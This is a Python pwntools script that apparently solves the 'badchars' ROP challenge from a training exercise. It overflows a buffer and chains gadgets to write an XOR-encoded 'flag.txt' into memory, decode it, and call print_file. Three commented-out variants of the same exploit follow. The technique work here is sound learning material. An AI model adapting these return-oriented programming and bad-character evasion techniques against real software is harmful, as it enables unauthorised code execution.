from pwn import *

exe = context.binary = ELF("badchars",checksec=False)
context.log_level = 'info'

offset = 40
data_section_address = 0x601030
pop_r12_r13_r14_r15 = 0x40069c
mov_r13_r12 = 0x400634
pop_r14_r15 = 0x4006a0
xor_r15_r14 = 0x400628
pop_rdi = 0x4006a3
print_file = 0x400620

xor_val = 2
xored_string = xor('flag.txt', xor_val)


xor_xploit = b''
data_offset = 0
for c in xored_string:
    xor_xploit += pack(pop_r14_r15)
    xor_xploit += pack(xor_val)
    xor_xploit += pack(data_section_address + data_offset)
    xor_xploit += pack(xor_r15_r14)
    data_offset += 1

payload = flat(
    asm('nop') * offset,
    pop_r12_r13_r14_r15,
    xored_string,
    data_section_address,
    0x0,
    0x0,
    mov_r13_r12,

    xor_xploit,

    pop_rdi,
    data_section_address,
    print_file
)

p = process()
p.clean()
p.sendline(payload)
p.interactive()





############################################################################################
############################################################################################
############################################################################################
############################################################################################

# # # from pwn import *

# # # exe = context.binary = ELF('badchars',checksec=False)

# # # offset = 40
# # # pop_r14_r15_gadget = 0x00000000004006a0
# # # xor_r14addr_r15_gadget = 0x0000000000400628
# # # pop_r12_13_14_15_gadget = 0x000000000040069c
# # # mov_r13addr_r12_gadget = 0x0000000000400634
# # # pop_rdi_gadget = 0x00000000004006a3
# # # print_file = 0x00400510
# # # data_section_addr = 0x00601028


# # # xor_value = 2
# # # xored_string = xor("flag.txt",xor_value)
# # # xor_xploit = b''
# # # data_offset = 0

# # # for c in xored_string:
# # #     xor_xploit += pack(pop_r14_r15_gadget)
# # #     xor_xploit += pack(xor_value)
# # #     xor_xploit += pack(data_section_addr + data_offset)
# # #     xor_xploit += pack(xor_r14addr_r15_gadget)
# # #     data_offset += 1

# # # payload = flat(
# # #     asm('nop') * offset,
# # #     pop_r12_13_14_15_gadget,
# # #     xored_string,
# # #     data_section_addr,
# # #     0x0,
# # #     0x0,
# # #     mov_r13addr_r12_gadget,

# # #     xor_xploit,

# # #     pop_rdi_gadget,
# # #     data_section_addr,
# # #     print_file
# # # )

# # # print(payload)
# # # p = process()
# # # p.clean()
# # # p.sendline(payload)
# # # p.interactive()
# # from pwn import *


# # elf = context.binary = ELF("badchars")

# # rop = ROP(elf)

# # p = process(elf.path)


# # def xor_string(string, key):

# #     xor_indxs =[]

# #     output = ""

# #     for indx, char in enumerate(string):

# #         if char in badchars:

# #             nchar = chr(ord(char) ^ key)

# #             output += nchar

# #             xor_indxs.append(indx)

# #             continue

# #         output += char

# #     return bytes(output.encode('latin')), xor_indxs


# # offset = 40


# # # Gadgets


# # pop_r12_r15 = p64(0x40069c) # pop r12; pop r13; pop r14; pop r15; ret; 

# # mov = p64(0x400634) # mov qword ptr [r13], r12; ret;

# # xor = p64(0x400628) # xor byte ptr [r15], r14b; ret;

# # pop_rdi  = (rop.find_gadget(['pop rdi', 'ret']))[0]


# # bss_addr = 0x601038

# # data2write = 'flag.txt'

# # badchars = ['x', 'g', 'a', '.']

# # xor_key = 2 # Just pick a random key.


# # xoredstr, xor_offsets = xor_string(data2write, xor_key)


# # # Stage 1 - Write Data into the .bss


# # payload = b'A' * offset
# # payload += pop_r12_r15
# # payload += xoredstr # Populate r12 with the xored string.
# # payload += p64(bss_addr) # Populate r13 with .bss address.
# # payload += p64(0xdeadbeefdeadbeef) # Junk for r14
# # payload += p64(0xdeadbeefdeadbeef) # Junk for r15
# # payload += mov # Preform the write.


# # # Stage 2 - Inverse the XOR Operation


# # for indx in xor_offsets:
# #     payload += pop_r12_r15
# #     payload += p64(0xdeadbeefdeadbeef) # Junk for r12
# #     payload += p64(0xdeadbeefdeadbeef) # Junk for r13
# #     payload += p64(xor_key) # Populate r14 with the xor key.
# #     payload += p64(bss_addr + indx) # Populate r15 with a byte of the ciphertext
# #     payload += xor 

# # # Stage 3 - Call the print_file function


# # payload += p64(pop_rdi)

# # payload += p64(bss_addr)

# # payload += p64(elf.plt.print_file)


# # p.recvuntil(b'> ')

# # p.sendline(payload)

# # p.interactive()

# #!/usr/bin/env python3
# # -*- coding: utf-8 -*-
# # pyright: reportUndefinedVariable=false
# from pwn import *

# exe = context.binary = ELF("badchars")


# def start(argv=[], *a, **kw):
#     if args.GDB:
#         return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
#     else:
#         return process([exe.path] + argv, *a, **kw)


# gdbscript = """
# b *0x40062b
# continue
# """.format(
#     **locals()
# )

# mov_r13_r12 = 0x0000000000400634
# xor_r15_r14 = 0x0000000000400628
# pop_rdi = 0x00000000004006A3
# pop_r14_r15 = 0x00000000004006A0
# pop_r12_r13_r14_r15 = 0x000000000040069C
# _data = 0x0000000000601030
# _bss = 0x0000000000601038
# ret = 0x00000000004004EE

# xor_value = 2
# # eobd-w{w
# xor_string = xor(b"flag.txt", xor_value)

# print("xor_string", xor_string)
# # stage-1 (writing to .data)
# pay = b"\x90" * 40
# pay += p64(ret)
# pay += p64(pop_r12_r13_r14_r15)
# pay += xor_string
# pay += p64(_data)
# pay += p64(0x0)
# pay += p64(0x0)
# pay += p64(mov_r13_r12)

# # stage-2 (xor)
# for _ in range(8):
#     pay += p64(pop_r12_r13_r14_r15)
#     pay += p64(0x0)
#     pay += p64(0x0)
#     pay += p64(xor_value)
#     pay += p64(_data + _)
#     pay += p64(xor_r15_r14)

# # stage-3 (calling print_file)
# pay += p64(pop_rdi)
# pay += p64(_data)
# pay += p64(exe.sym.print_file)


# io = start()
# io.sendlineafter(b"> ", pay)
# io.interactive()


############################################################################################
############################################################################################
############################################################################################
############################################################################################
